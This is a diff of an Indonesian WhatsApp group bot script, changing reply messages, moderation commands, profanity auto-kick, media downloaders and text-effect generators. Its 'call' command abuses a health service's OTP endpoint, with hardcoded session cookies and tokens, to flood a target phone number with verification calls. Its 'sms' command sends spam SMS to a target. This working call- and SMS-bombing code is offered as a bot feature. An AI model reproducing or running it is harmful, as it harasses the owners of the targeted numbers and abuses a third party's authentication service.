+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
 await loading()
 if (args[0] === 'close'){
 await haikal.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
@@ -4308,9 +3958,9 @@ Group Close`}, {quoted:m})
 break
 //=================================================//
 case 'editinfo': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isAdmins) return m.reply('ONLY Group Admin')
+if (!isCreator) return m.reply(`*special Premium*`)
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
 await loading()
  if (args[0] === 'open'){
 await haikal.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
@@ -4326,7 +3976,7 @@ Editinfo Close`}, {quoted:m})
 break
 //=================================================//
 case 'join': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 if (!text) throw 'Masukkan Link Group!'
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 await loading()
@@ -4336,22 +3986,22 @@ await haikal.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).c
 break
 //=================================================//
 case 'editsubject': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isBotAdmins) return m.reply('BOT AINT ADMIN')
-if (!isAdmins) return m.reply('ONLY Group Admin')
-if (!text) throw 'Text nya ?'
+if (!isCreator) return m.reply(`*special Premium*`)
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
+if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
+if (!text) throw 'text ?'
 await loading()
 await haikal.groupUpdateSubject(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
 }
 break
 //=================================================//
 case 'editdesk':{
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isBotAdmins) return m.reply('BOT AINT ADMIN')
-if (!isAdmins) return m.reply('ONLY Group Admin')
-if (!text) throw 'Text Nya ?'
+if (!isCreator) return m.reply(`*special Premium*`)
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
+if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
+if (!text) throw 'text ?'
 await loading()
 await haikal.groupUpdateDescription(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
 }
@@ -4370,10 +4020,10 @@ haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }
 break
 //=================================================//
 case'demoteall':
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isBotAdmins) return m.reply('BOT AINT ADMIN')
-if (!isAdmins) return m.reply('ONLY Group Admin')
+if (!isCreator) return m.reply('*special Owner Bot*')
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
+if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
 await loading()
 var groupe = await haikal.groupMetadata(from)
 var members = groupe['participants']
@@ -4385,10 +4035,10 @@ haikal.groupParticipantsUpdate(from, mems, 'demote')
 break
 //=================================================//
 case'promoteall':
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isBotAdmins) return m.reply('BOT AINT ADMIN')
-if (!isAdmins) return m.reply('ONLY Group Admin')
+if (!isCreator) return m.reply('*special Owner Bot*')
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
+if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
 await loading()
 var groupe = await haikal.groupMetadata(from)
 var members = groupe['participants']
@@ -4403,12 +4053,12 @@ case 'tutorial': {
 await loading()
  m.reply(`◎ © Heyyo ${pushname} 🌝 What's Good ${salam}
 Tutorial Run Via Panel
-https://youtu.be/duxbot6413`)
+https://youtu.be/rqqxkI4P8YY`)
 }
 break
 //=================================================//
 case 'sewa':
-if (isBan) return m.reply('*BANNED BY OWNER*')
+if (isBan) return m.reply('*Lu Di Ban Owner*')
 await loading()
 m.reply(`¥ *Price Sewa Bot Shekai* €
 
@@ -4422,7 +4072,7 @@ Untuk Melanjutkan Sewa Silahkan Ketik Contoh Di bawah
 break
 //=================================================//
 case 'sewabot':
-if (isBan) return m.reply('*BANNED BY OWNER*')
+if (isBan) return m.reply('*Lu Di Ban Owner*')
 if (!text) return m.reply(`*Contoh* :\n#sewabot 1 minggu `)
 await loading()
 let cret = await haikal.groupCreate(args.join(" "), [])
@@ -4434,7 +4084,7 @@ Sewa Bot Selama *${text}* Sedang Dalam Prosess Silahkan Masuk Melalui Link Group
 _▸ Owner : ${botname}
 _▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
 `, m})
-m.reply('pesan dan link group Special sudah terkirim di chat privasi anda')
+m.reply('pesan dan link group special sudah terkirim di chat privasi anda')
 break
 //=================================================//
 case 'sticker': case 's': case 'stickergif': case 'sgif': {
@@ -4456,7 +4106,7 @@ throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 D
 break
 //=================================================//
 case 'inspect': {
-if (isBan) return m.reply('*BANNED BY OWNER*')
+if (isBan) return m.reply('*Lu Di Ban Owner*')
 await loading()
 if (!args[0]) return m.reply("Linknya?")
 let linkRegex = args.join(" ")
@@ -4494,7 +4144,7 @@ haikal.sendFile(from, pp, "", m, { caption: tekse, mentions: await haikal.parseM
 break
 //=================================================
 case 'hw': { 
-if (isBan) return m.reply('*BANNED BY OWNER*')
+if (isBan) return m.reply('*Lu Di Ban Owner*')
 joauuuuuuu = fs.readFileSync('./baseikal/video/hwmods2.mp4')
 haikal.sendMessage(m.chat, {video: joauuuuuuu, caption:`selamat datang`,viewOnce : true},{quoted:m })
 }
@@ -4502,8 +4152,8 @@ break
 //=================================================
 case "welcome":
 {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
+if (!isCreator) return m.reply('*special Owner Bot*')
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
 await loading()
 if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
 if (args[0] === "on") {
@@ -4526,7 +4176,7 @@ m.reply('Sukses Mematikan Welcome  di group ini')
 break
 //=================================================
 case 'bcgc': case 'bcgroup': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 await loading()
 if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
 let getGroups = await haikal.groupFetchAllParticipating()
@@ -4542,10 +4192,9 @@ m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
 break
 //=================================================//
 case 'antilink': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isBotAdmins) return m.reply('BOT AINT ADMIN')
-if (!isAdmins) return m.reply('ONLY Group Admin')
+if (!isCreator) return m.reply(`*special Premium*`)
+if (!m.isGroup) return groupon(from)
+if (!isAdmins && !isCreator) return sticAdmin(from)
 await loading()
 if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
 if (args[0] === "on") {
@@ -4563,27 +4212,12 @@ m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
 }
 break
 //=================================================
-case 'autodelete': {
-if (!isCreator) return
-if (args.length < 1) return
-if (args[0] === "on") {
-if (autodelete) return
-antidel.push(from)
-} else if (args[0] === "off") {
-if (!autodelete) return
-let off = antidel.indexOf(from)
-antidel.splice(off, 1)
-} else {
-}
-}
-break
-//=================================================
 case "antitoxic":
 {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-if (!isBotAdmins) return m.reply('BOT AINT ADMIN')
-if (!isAdmins) return m.reply('ONLY Group Admin')
+if (!isCreator) return m.reply(`*special Premium*`)
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
+if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
 await loading()
 if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
 if (args[0] === "on") {
@@ -4607,8 +4241,8 @@ break
 //=================================================
 case 'larangan': case 'peraturan': {
 await loading()
- if (!m.isGroup) return m.reply('GROUP FEATURESoh')
-haikal.sendMessage(from, { text : `t DUX BOT
+ if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
+haikal.sendMessage(from, { text : `Haii 👋 Aku Shekai Bot ʜᴡ ᴍᴏᴅꜱ ᴡᴀ
 Aku Sebagai Admin Akan Melarang Kalian Untuk Toxic Ataupun Berkata Kasar Di group Ini !!!
 
 Larangan !!!
@@ -4617,48 +4251,32 @@ ajg
 anjing
 ngentod
 bangsat
-bgst
-babi
-kontol
-memek
-penis
-pukimak
-tolol
-gblg
-gblok` , mentions: participants.map(a => a.id)}, {quoted:m})
+bgst` , mentions: participants.map(a => a.id)}, {quoted:m})
 }
 break
 //=================================================//
-case 'fuck': case 'ajg': case 'ngentod': case 'bangsat': case'anjing': case'babi': case'kontol': case'memek': case'penis': case 'ngewe': case 'yatim': case 'piatu': case 'pentil': case 'pepek': case 'tempi': case 'tempe': case 'bajingan': case 'ndasmu':{
+case 'fuck': case 'ajg': case 'ngentod': case 'bangsat': case'anjing': case'babi': {
 if (!welcmm) return
-if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
 if (!m.isGroup) return m.reply('Jangan Toxic Coy Kalau Di group Dah Ku Kick Anjay')
-if (isAdmins) return haikal.sendMessage(m.chat, {text: `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nAdmin sudah Toxic, admin bebas Toxic apapun`})
-if (isCreator) return haikal.sendMessage(m.chat, {text: `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\Owner telah Toxic, owner bebas Toxic apa pun`})
-await haikal.sendMessage(m.chat,
-{
-delete: {
-remoteJid: m.chat,
-fromMe: false,
-id: mek.key.id,
-participant: mek.key.participant
-}
-})
-haikal.sendMessage(from, {text:`\`\`\`「 Kata Kata Toxic Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan toxic di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:hw})
+if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
+await loading()
+kicee = m.sender
+await haikal.groupParticipantsUpdate(from, [kicee], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+haikal.sendMessage(from, {text:`「 Detect Toxic 」\n\n@${kicee.split("@")[0]} Telah dikick karena Telah Toxic di group ini`, contextInfo:{mentionedJid:[kicee]}}, {quoted:m})
 }
 break
 //=================================================//
 case "call":
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
-if (!args[0]) return reply(`Usersan ${prefix+command} nomor\nContoh ${prefix+command} +2347082252014`)
+if (!args[0]) return reply(`usersan ${prefix+command} nomor\nContoh ${prefix+command} +2347082252014`)
 let nosend = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
 if (args[0].startsWith(`+2347082252014`)) return reply('Tidak bisa call ke nomor ini!')
 axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
 break
 //=================================================
 case 'sms': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
 const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 if (m.quoted || text) {
@@ -4683,126 +4301,104 @@ console.log(res);
 console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY DUX BOT MODS`);
 });
 }
-} else reply(`Usersan spamsms nomor/reply pesan target*\nContoh spamsms +2347082252014`)
+} else reply(`usersan spamsms nomor/reply pesan target*\nContoh spamsms +2347082252014`)
 m.reply(`spam sms/call akan di kirim ke no target`)
 }
 break
 //=================================================//
-case 'yts': case 'ytsearch': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!text) throw `Example : ${prefix + command} story wa anime`
-let search = await yts(text)
-let teks = '*YouTube Search*\n\n Result From '+text+'\n\n'
-let no = 1
-for (let i of search.all) {
-teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
-}
-haikal.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
+case "fbvideo": case "fbreels":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+if (!text) return m.reply('Link nya kak?\n\nContoh : .facebook https://www.facebook.com/reel/478437244198357')
+m.reply('*Sabar Cuy Loading*')
+let res = await facebook(text)
+let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted:m})
 }
 break
-//=================================================
-case 'ytmp3': case 'youtubemp3': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
-await loading ()
-downloadMp3(text)
+//=================================================//
+case "igvideo": case "igreels":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+if (!text) return m.reply('Link nya kak?\n\nContoh : .instagram https://www.instagram.com/tv/CEjIHlnpyvI/?igshid=NTdlMDg3MTY=')
+m.reply('*Sabar Cuy Loading*')
+let res = await instagram(text)
+let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted:m})
 }
 break
-//=================================================
-case 'ytmp4': case 'youtubemp4': {
-if (!isCreator) return m.reply('*Special Premium*')
+//=================================================//
+case "twitvideo":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+if (!text) return m.reply('Link nya kak?\n\nContoh : .twitter https://twitter.com/FCBarcelona_es/status/1615392117026586628?s=20&t=Djtl01fwdxTX1I5g-tm72A')
+m.reply('*Sabar Cuy Loading*')
+let res = await twitter(text)
+let ghd = await haikal.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted:m})
+}
+break
+//=================================================//
+case "tiktokvideo":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+ if (!text) return m.reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok(text)
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 Url :  ${text}`}, {quoted:m})
+}
+break
+//=================================================//
+case "tiktokaudio":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+ if (!text) return m.reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok(text)
+let ghd = await haikal.sendMessage(from,{audio:{url: res.url[1].url}, mimetype: "audio/mp4", ptt:false, contextInfo:{  externalAdReply: { showAdAttribution: true,
+mediaType:  1,
+mediaUrl: 'https://wa.me/2347082252014',
+title: `DUX BOT MODS WA`,
+sourceUrl: `https://wa.me/2347082252014`, 
+thumbnail: thumb
+}
+}})
+}
+break
+//=================================================//
+case 'ytvn': {
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
 if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
-let { ytv } = require('./lib/y2mate')
+ let { ytv } = require('./lib/y2mate')
 let quality = args[1] ? args[1] : '360p'
 let media = await ytv(text, quality)
-if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
-haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP4\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
+haikal.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mp4', ptt: true, fileName: `${media.title}.mp3`, caption: `✇ Title : ${media.title}\n✇ File Size : ${media.filesizeF}\n✇ Url : ${isUrl(text)}\n✇ Ext : MP3\n✇ Resolusi : ${args[1] || '360p'}`, contextInfo:{  externalAdReply: { showAdAttribution: true,
+mediaType:  1,
+mediaUrl: 'https://wa.me/2347082252014',
+title: `DUX BOT MODS WA`,
+sourceUrl: `https://wa.me/2347082252014`, 
+thumbnail: thumb
+}
+}})
 }
 break
-//=================================================
-case 'getmusic': {
-if (!isCreator) return m.reply('*Special Premium*')
-if (!text) throw `Example : ${prefix + command} 1`
-if (!m.quoted) return m.reply('Reply Pesan')
-if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
-let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
-if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
-await loading ()
-downloadMp3(urls[text - 1])
+//=================================================//
+case 'ytmp4': case 'ytvideo': {
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
+ let { ytv } = require('./lib/y2mate')
+ let quality = args[1] ? args[1] : '360p'
+ let media = await ytv(text, quality)
+ if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
+ haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `Ketik Tovn Dan Reply Video Untuk Menjadikan Voice/Vn 
+- Tovn
+- Toaud` }, {quoted:m})
 }
 break
-//=================================================
-case 'getvideo': {
-if (!isCreator) return m.reply('*Special Premium*')
-let { ytv } = require('./lib/y2mate')
-if (!text) throw `Example : ${prefix + command} 1`
-if (!m.quoted) return m.reply('Reply Pesan')
-if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
-let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
-if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
-let quality = args[1] ? args[1] : '360p'
-let media = await ytv(urls[text - 1], quality)
-if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
-haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
-}
-break
-//=================================================
-case "ytreels": case "youtubereels":{
-if (!isCreator) return m.reply('*Special Premium*')
-if (!text) return m.reply('Masukan Link Nya!!!')
-await loading ()
-downloadMp4(text)
-}
-break
-//=================================================
-case 'tiktokvideo':{
-if (!isCreator) return m.reply('*Special Premium*')
-if (!text) return m.reply( `Example : ${prefix + command} link`)
-if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
-await loading ()
-require('./lib/tiktok').Tiktok(q).then( data => {
-haikal.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
-})
-}
-break
-//=================================================
-case 'tiktokmp3':
-case 'tiktokaudio':{
-if (!isCreator) return m.reply('*Special Premium*')
-if (!text) return m.reply( `Example : ${prefix + command} link`)
-if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
-await loading ()
-require('./lib/tiktok').Tiktok(q).then( data => {
-haikal.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
-})
-}
-break
-//=================================================
-case 'igvideo': case 'igreels':
-			if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/tv/CXwPLSIFDW0/?igshid=NTc4MTIwNjQ2YQ==`)
-			await loading()
-			axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
-				haikal.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4', caption : `silahkan ketik tovn atau to audio untuk merubah nya menjadi audio / vn`})
-			})
-			break
-		
-		case 'fbvideo':
-			if (args.length == 0) return reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
-			await loading()
-			axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
-				haikal.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4', caption : `silahkan ketik tovn atau to audio untuk merubah nya menjadi audio / vn` })
-			})
-			break
-			
-			case 'twitvideo':
-			if (args.length == 0) return reply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
-			axios.get(`https://api.lolhuman.xyz/api/twitter?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
-				haikal.sendMessage(from, { video: { url: data.result.link[data.result.link.length - 1].link }, mimetype: 'video/mp4' })
-			})
-			break
 //=================================================//
 case 'wm': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let teks = `${text}`
 {
@@ -4817,7 +4413,7 @@ await fs.unlinkSync(encmedia)
 break
 //=================================================//
 case 'wmvideo':{
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let teks = `${text}`
 {
@@ -4833,43 +4429,322 @@ throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 D
 }
 break
 //=================================================//
-// Textprome //
-case 'blackpink':
-case 'neon':
-case 'greenneon':
-case 'advanceglow':
-case 'futureneon':
-case 'sandwriting':
-case 'sandsummer':
-case 'sandengraved':
-case 'metaldark':
-case 'neonlight':
-case 'holographic':
-case 'text1917':
-case 'minion':
-case 'deluxesilver':
-case 'newyearcard':
-case 'bloodfrosted':
-case 'halloween':
-case 'jokerlogo':
-case 'fireworksparkle':
-case 'natureleaves':
-case 'bokeh':
-case 'toxic':
-case 'strawberry':
-case 'box3d':
-case 'roadwarning':
-case 'breakwall':
-case 'icecold':
-case 'luxury':
-case 'cloud':
-case 'summersand':
-case 'horrorblood':
-case 'thunder':
-	if (args.length == 0) return reply(`Example: ${prefix + command} DUX BOT`)
-	await loading()
-	haikal.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${command}` } })
-	break
+case 'play': {
+if (!isCreator) return m.reply(`*special Premium*`)
+await loading()
+if (!text) throw `Example : ${prefix + command} story wa anime`
+let yts = require("yt-search")
+let search = await yts(text)
+let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
+haikal.sendMessage(m.chat,  {
+image: { url: anu.thumbnail },
+caption: `
+辛 Title : ${anu.title}
+辛 Ext : Search
+辛 Id : ${anu.videoId}
+⏳ Duration : ${anu.timestamp}
+辛 Viewers : ${anu.views}
+辛 Upload At : ${anu.ago}
+辛 Author : ${anu.author.name}
+辛 Channel : ${anu.author.url}
+辛 Description : ${anu.description}
+辛 Url : ${anu.url}
+
+辛 ytmp4 ${anu.url}
+辛 ytvn ${anu.url}`}, {quoted:m})
+}
+break
+//=================================================
+case 'ytsearch':
+if (!isCreator) return m.reply(`*special Premium*`)
+await loading()
+if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
+axios
+.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${command}`)
+.then(({ data }) => {
+var text = ''
+for (var x of data.result) {
+text += `Title : ${x.title}\n`
+text += `Views : ${x.views}\n`
+text += `Published : ${x.published}\n`
+text += `Thumbnail : ${x.thumbnail}\n`
+text += `Unduh Mengunduh Silahkan Ketik Ytmp4 https://www.youtube.com/watch?v=${x.videoId} Atau Ytvn https://www.youtube.com/watch?v=${x.videoId}\n\n`
+}
+reply(text)
+})
+.catch(console.error)
+break
+//=================================================//
+case 'ytplay':
+if (!isCreator) return m.reply(`*special Premium*`)
+await loading()
+if (args.length == 0) return await reply(`Example: ${prefix + command} melukis senja`)
+axios
+.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${command}`)
+.then(({ data }) => {
+axios.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=https://www.youtube.com/watch?v=${data.result[0].videoId}`).then(({ data }) => {
+var caption = `❖ Title    : *${data.result.title}*\n`
+caption += `❖ Size     : *${data.result.size}*`
+haikal.sendMessage(from, { image: { url: data.result.thumbnail }, caption }).then(() => {
+haikal.sendMessage(from, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
+})
+})
+})
+.catch(console.error)
+break
+//=================================================//
+case 'candy': 
+case 'christmas': 
+case '3dchristmas': 
+case 'sparklechristmas':
+case 'deepsea': 
+case 'scifi': 
+case 'rainbow': 
+case 'waterpipe': 
+case 'spooky': 
+case 'pencil': 
+case 'circuit': 
+case 'discovery': 
+case 'metalic': 
+case 'fiction': 
+case 'demon': 
+case 'transformer': 
+case 'berry': 
+case 'thunder': 
+case 'magma': 
+case '3dstone': 
+case 'neonlight': 
+case 'glitch': 
+case 'harrypotter': 
+case 'brokenglass':
+case 'papercut': 
+case 'watercolor':
+case 'multicolor': 
+case 'neondevil': 
+case 'underwater': 
+case 'graffitibike':
+ case 'snow': 
+ case 'cloud': 
+ case 'honey': 
+ case 'ice': 
+ case 'fruitjuice': 
+ case 'biscuit': 
+ case 'wood': 
+case 'chocolate': 
+case 'strawberry': 
+case 'matrix': 
+case 'blood': 
+case 'dropwater': 
+case 'toxic': 
+case 'lava': 
+case 'rock': 
+case 'bloodglas': 
+case 'hallowen': 
+case 'darkgold': 
+case 'joker': 
+case 'wicker':
+ case 'firework': 
+ case 'skeleton': 
+ case 'blackpink': 
+ case 'sand': 
+ case 'glue': 
+ case '1917': 
+ case 'leaves': {
+ if (isBan) return m.reply('*banned by owner Tolol*')
+ await loading()
+ if (!text) return m.reply(`Contoh : ${prefix + command} ${botname}`) 
+m.reply('*Sabar Cuy Loading*')
+let link
+if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
+if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
+if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
+if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
+if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
